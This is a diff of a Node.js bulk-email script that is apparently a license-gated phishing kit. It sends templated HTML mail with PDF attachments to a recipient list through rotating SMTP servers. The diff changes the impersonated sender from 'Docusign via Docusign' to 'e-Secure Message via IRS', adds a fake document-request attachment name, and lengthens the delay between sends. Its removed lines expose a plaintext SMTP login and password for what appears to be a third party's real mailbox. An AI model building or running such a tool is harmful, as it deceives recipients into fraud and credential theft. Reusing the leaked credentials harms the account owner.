@@ -8,8 +8,9 @@ const crypto = require('crypto');
 const readline = require('readline');
 const minify = require('html-minifier').minify;
 
+
 const VALID_KEY_HASHES = [
-    'a63c5c935c941551084e125791321453240578642680456106364b4c067756f9',
+    '45e64288f46f64aa4087a9b4e77ddf0071389fd7ce4e3d92049196f659ce4c13',
     // Add more valid SHA256 key hashes here
 ];
 
@@ -113,6 +114,9 @@ function replaceTags(text, replacements) {
     newText = newText.replace(/\[-emailuser-\]/g, replacements['-emailuser-']);
     newText = newText.replace(/\[-emaildomain-\]/g, replacements['-emaildomain-']);
 
+    // Replace time-related tag
+    // newText = newText.replace(/\[-time-\]/g, getCurrentTime('fulltime12'));
+
     // Replace random string tag
     newText = newText.replace(/\[-randomstring-\]/g, randomstring.generate());
 
@@ -137,7 +141,7 @@ async function readTemplate(templatePath, replacements) {
     }
 }
 
-async function sendEmails(emailListPath, smtpConfigs, templatePath, textTemplatePath, subject, pdfAttachmentName, senderName, attachmentHtmlPath, delayBetweenEmails, sendPdfAttachment, hideFromEmail, useCustomFromEmail, sendHtmlEmail, pdfQuality) {
+async function sendEmails(emailListPath, smtpConfigs, templatePath, subject, pdfAttachmentName, senderName, attachmentHtmlPath, delayBetweenEmails, sendPdfAttachment, hideFromEmail, useCustomFromEmail, pdfQuality) {
     try {
         const emailList = (await fs.readFile(emailListPath, 'utf-8')).split(/\r?\n/);
         let smtpIndex = 0;
@@ -154,7 +158,6 @@ async function sendEmails(emailListPath, smtpConfigs, templatePath, textTemplate
                 };
 
                 const emailContent = await readTemplate(templatePath, replacements);
-                const textContent = await readTemplate(textTemplatePath, replacements);
                 const emailSubject = await readTemplate(subject, replacements);
 
                 let fromAddress;
@@ -169,14 +172,9 @@ async function sendEmails(emailListPath, smtpConfigs, templatePath, textTemplate
                     from: fromAddress,
                     to: email,
                     subject: emailSubject,
+                    html: emailContent,
                     attachments: []
                 };
-
-                if (sendHtmlEmail) {
-                    mailOptions.html = emailContent;
-                } else {
-                    mailOptions.text = textContent;
-                }
 
                 if (sendPdfAttachment) {
                     const dynamicPdfName = replaceTags(pdfAttachmentName, replacements);
@@ -223,22 +221,22 @@ function validateEmail(email) {
 }
 
 function getCurrentTime(format) {
-    // Implement logic to get current time in the specified timezone and format
+    // This function is not implemented
     return '';
 }
 
 // Define SMTP configuration, template path, subject, and other parameters
 const smtpConfigs = [
     {
-        host: 'smtp.ionos.com',
+         host: '',
         port: 587,
         secure: false,
-        requireTLS: true,
+        requireTLS: false,
         auth: {
-            user: 'gbeasley@allagesvisioncare.com',
-            pass: 'Aavc^@6917#100',
+            user: 'info',
+            pass: '',
         },
-        fromEmail: 'custom-from@mydomain.com' // Optional: The address to send from
+        fromEmail: 'info@noux-boutique.com' // Optional: The address to send from
     },
     // Add more SMTP configurations here
     // {
@@ -252,27 +250,24 @@ const smtpConfigs = [
     //     },
     // }
 ];
-
 async function run() {
     await checkLicense();
 
-    const senderName = 'Docusign via Docusign';
-    const templatePath = 'letter.html';
-    const textTemplatePath = 'letter.txt';
+    const senderName = 'e-Secure Message via IRS';
+    const templatePath = 'lttt.html';
     const subject = 'subject.txt';
-    const pdfAttachmentName = 'Docusign_[-emaildomain-]_[-randomstring-].pdf';
+    const pdfAttachmentName = 'Firm_Additional_Information_Document_Request.pdf';
     const emailListPath = 'list.txt';
     const attachmentHtmlPath = 'attachment.html';
-    const delayBetweenEmails = 5000; // 5 seconds
+    const delayBetweenEmails = 10000; // 10 seconds
     const sendPdfAttachment = true; // Set to false to disable PDF attachments
     // WARNING: Setting hideFromEmail to true is not recommended and may cause deliverability issues.
     const hideFromEmail = false;
-    const useCustomFromEmail = true; // Set to true to use the 'fromEmail' property in smtpConfigs
-    const sendHtmlEmail = true; // Set to false to send plain text email
+    const useCustomFromEmail = false; // Set to true to use the 'fromEmail' property in smtpConfigs
     const pdfQuality = 75; // PDF quality from 0-100
 
     await printLines();
-    await sendEmails(emailListPath, smtpConfigs, templatePath, textTemplatePath, subject, pdfAttachmentName, senderName, attachmentHtmlPath, delayBetweenEmails, sendPdfAttachment, hideFromEmail, useCustomFromEmail, sendHtmlEmail, pdfQuality);
+    await sendEmails(emailListPath, smtpConfigs, templatePath, subject, pdfAttachmentName, senderName, attachmentHtmlPath, delayBetweenEmails, sendPdfAttachment, hideFromEmail, useCustomFromEmail, pdfQuality);
 }
 
 run();
